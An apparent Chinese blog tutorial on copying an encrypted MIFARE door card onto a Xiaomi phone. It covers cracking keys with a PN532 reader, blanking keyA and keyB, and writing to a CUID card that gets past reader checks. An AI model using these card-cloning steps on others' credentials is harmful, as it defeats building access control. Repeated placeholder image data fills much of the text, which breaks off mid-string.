src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/10/31/Qjfb49knhDBv1Se.jpg" alt="distinguish"></p><h4 id="UID-CUID-FUID-UFUID-卡">UID CUID FUID UFUID 卡</h4><h5 id="UID-卡">UID 卡</h5><p>普通复制卡，可以重复擦写所有扇区，主要应用在IC卡复制上，遇到带有防火墙的读卡器就会失效。</p><h5 id="CUID-卡">CUID 卡</h5><p>可擦写防屏蔽卡，可以重复擦写所有扇区，UID卡复制无效的情况下使用，可以绕过防火墙，但对于有些防火墙无效，需用到FUID卡。</p><h5 id="FUID-卡">FUID 卡</h5><p>不可擦写防屏蔽卡，此卡的特点0扇区只能写入一次，写入一次变成 M1 卡，CUID 复制没用的情况下使用，可以绕过防火墙。</p><h5 id="UFUID-卡">UFUID 卡</h5><p>高级复制卡，我们就理解为是 UID 和 FUID 的合成卡，需要封卡操作，不封卡就是 UID 卡，封卡后就变为 M1 卡。</p><h3 id="小米手机模拟门卡的原理">小米手机模拟门卡的原理</h3><p>小米手机模拟门卡有两种方式：</p><ol><li><p><strong>开空白卡片</strong>.</p><p>​通过选择 “自定义空白卡”， 并且进行身份认证，可以为手机开通一张空白的卡片，再将卡贴进发卡机器，即可获得一张全新卡片。</p><p>​这个方法有一个很明显的弊端，就是 卡片 uid <strong>无法模拟</strong>，当遇到根据 uid 识别身份的场景，这种方法就不凑效了。</p><blockquote><p>这是一种最直接通过物管获取卡片的方式，如果物管好说话可以直接找他们帮助发卡。</p></blockquote></li><li><p><strong>复制非加密卡</strong></p><p>​小米手机会自动识别卡片类型，如果卡片的所有扇区均未加密，即可进行复制并且完全模拟。</p><p>优势很明显： 可以 <strong>完全复制</strong> 包括 uid 在内的所有卡片信息（厂商信息除外）</p><p>缺点：只能复制非加密卡</p><p>​似乎只有非加密卡才能被复制 uid ，难道加密卡只能复制除了0扇区之外的信息了吗？</p><p><strong>答案当然不是这样的！</strong></p><p>我们可以通过 <strong>伪造非加密卡</strong> 来达到复制uid的效果！</p><p>因为卡片的任意数据都是可以被自由修改的，我们可以将卡片的密钥清除，将其伪装成一张 <strong>非加密卡</strong> 写入小米手机后，再用设备将密钥写回去。</p><h2 id="过程">过程</h2><h3 id="准备原料">准备原料</h3><ol><li><p>带NFC功能的小米手机/手环</p></li><li><p><strong>PN532</strong> 一台（其他读卡器也可）</p><blockquote><p>首先确认一下线序，<strong>插错必烧</strong>！</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/ODMvP2WXskCU4AE.jpg" alt="QQ图片20191101120958_cr.jpg"></p></li><li><p>空白 <strong>cuid卡</strong> 一张</p></li></ol><h3 id="读取原卡">读取原卡</h3><p>打开上位机，读取原卡内容。</p><p>（涉及到破解密钥的过程，时间会有点长，但只要能解析出原信息，那么都是可以模拟的）</p><blockquote><p>我们可以看到卡片的大致结构</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/odsBZbEF7Omh26T.png" alt="QQ图片20191101114910.png"></p><p>0扇区的第0块主要存储卡的基本信息，包括 <strong>UID</strong> 以及 <strong>厂商信息</strong></p><p>第3块的前6个字节存储该扇区的 <strong>keyA</strong>，中间4个字节是访问控制码 ，后6个字节存储 <strong>keyB</strong>。</p><p>由于这是一张加密卡，所以我们得把数据 <strong>dump</strong> 下来，并且将数据通过非加密卡传入手机中</p><h3 id="dump-并-修改数据">dump 并 修改数据</h3><p>点击上位机左上角的三角形图标，dump数据</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/4pBCRYbsa3UDqJG.png" alt="QQ图片20191101114910.png"></p></li></ol><p>然后可以把这个数据先备份下来，为后面给手机写入 <strong>原卡数据</strong> 做准备</p><p>用 <strong>010editor</strong> 打开dump后的数据</p><p>我们需要把加密卡转换成非加密卡，只需要把 <strong>keyA keyB</strong> 写为 <strong>FFFFFFFFFFFF</strong> 即可（相当于无密钥）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/vBpSiFHx8Kutcj7.png" alt="QQ图片20191101114910.png"></p><blockquote><p>可以用替换命令一键替换</p></blockquote><p>其他东西不用管，只需要确保密钥被清除即可，然后保存</p><h3 id="写入白卡">写入白卡</h3><p>一键写入，不需赘述。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/11/01/o2XsDmAqkhv16Ln.png" alt="QQ图片20191101114910.png"></p><p>写卡完成之后再读取一遍，确认我们已经成功抹掉密钥</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFg